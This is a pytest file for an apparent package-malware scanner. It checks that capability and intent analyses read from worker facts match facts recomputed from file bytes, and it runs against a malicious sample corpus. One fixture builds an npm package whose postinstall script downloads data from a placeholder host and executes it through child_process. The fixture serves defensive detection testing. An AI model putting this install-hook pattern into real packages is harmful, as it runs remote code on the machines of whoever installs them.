"""Item 56, sites 9 and 10: the capability profile, the intent observation and the reached-flow facts are
read from the workers' facts, never from a file in the parent. In a real scan each is computed twice:
from the facts the workers sent, and from facts this process recomputes from each unit's bytes by the
same producer (`WorkerAnalysis.produce`). The two must be equal, key for key."""

from __future__ import annotations

import io
import tarfile
from pathlib import Path
from typing import Any, ClassVar

import pytest

from cordon_scanner import Scanner
from cordon_scanner.engine.engine import Engine
from cordon_scanner.engine.isolation.analysis_facts import WorkerAnalysis
from cordon_scanner.engine.isolation.facts import Facts, WorkerFacts
from cordon_scanner.foundation.config.settings import Config
from support import ROOT

MALICIOUS = sorted(p for p in (ROOT / "corpus" / "malicious").iterdir() if p.is_dir())


class FromBytes:
    """Each unit's facts recomputed here, from its bytes, as a worker computes them."""

    compared: ClassVar[list[str]] = []

    @staticmethod
    def facts(engine: Engine, units: Any, ctx: Any) -> dict[str, dict[str, list[Any]]]:
        out: dict[str, dict[str, list[Any]]] = {}
        for unit in units:
            WorkerFacts.begin()
            try:
                WorkerAnalysis.produce(unit, ctx, tuple(engine.detectors))
            finally:
                text = WorkerFacts.end()
            accepted, why = Facts.accept(text, 0)
            assert accepted is not None, why
            if accepted:
                out[unit.path] = accepted
        return out

    @staticmethod
    def install(monkeypatch: pytest.MonkeyPatch) -> None:
        profile, intent = Engine._capability_profile, Engine._intent_observation
        FromBytes.compared = []

        def both_profiles(self: Engine, units: Any, ctx: Any, facts: Any) -> dict[str, float]:
            sent = profile(self, units, ctx, facts)
            assert sent == profile(self, units, ctx, FromBytes.facts(self, units, ctx))
            FromBytes.compared.append("profile")
            return sent

        def both_intents(self: Engine, units: Any, ctx: Any, facts: Any) -> Any:
            sent = intent(self, units, ctx, facts)
            again = intent(self, units, ctx, FromBytes.facts(self, units, ctx))
            if sent is None or again is None:
                assert sent is again
            else:
                assert (sent.facts, sent.unexamined, sent.files) == (
                    again.facts,
                    again.unexamined,
                    again.files,
                )
            FromBytes.compared.append("intent")
            return sent

        monkeypatch.setattr(Engine, "_capability_profile", both_profiles)
        monkeypatch.setattr(Engine, "_intent_observation", both_intents)

    @staticmethod
    def scan(target: Path) -> Any:
        return Scanner(Config.default().with_overrides(use_cache=False, offline=True)).scan(target)


class TestTheParentReadsTheWorkersFacts:
    @pytest.mark.parametrize("sample", MALICIOUS, ids=lambda p: p.name)
    def test_on_every_malicious_corpus_sample(self, sample: Path, monkeypatch) -> None:
        FromBytes.install(monkeypatch)
        FromBytes.scan(sample)
        assert "profile" in FromBytes.compared

    def test_on_a_package_with_install_hook_imports_and_minified_code(
        self, tmp_path: Path, monkeypatch
    ) -> None:
        files = {
            "package.json": '{"name": "p", "version": "1.0.0", "main": "index.js", '
            '"scripts": {"postinstall": "node setup.js"}}',
            "setup.js": 'const cp = require("child_process");\nconst https = require("https");\n'
            'https.get("https://example.invalid/x", (r) => r.on("data", (d) => cp.exec(String(d))));\n',
            "index.js": 'import{a}from"./lib.js";\nexport default () => process.env.HOME + a;\n',
            "lib.js": "export const a = 1;\n",
        }
        target = tmp_path / "p-1.0.0.tgz"
        with tarfile.open(target, "w:gz") as tar:
            for name, text in files.items():
                data = text.encode()
                info = tarfile.TarInfo(f"package/{name}")
                info.size = len(data)
                tar.addfile(info, io.BytesIO(data))
        FromBytes.install(monkeypatch)
        FromBytes.scan(target)
        assert {"profile", "intent"} <= set(FromBytes.compared)

    def test_invalid_utf8_is_read_the_same_way(self, tmp_path: Path, monkeypatch) -> None:
        root = tmp_path / "pkg"
        root.mkdir()
        (root / "package.json").write_text(
            '{"name": "q", "version": "1.0.0", "main": "index.js"}', encoding="utf-8"
        )
        (root / "index.js").write_bytes(b'require("child_process").exec("x\xff\xfe");\n')
        FromBytes.install(monkeypatch)
        FromBytes.scan(root)
        assert "profile" in FromBytes.compared
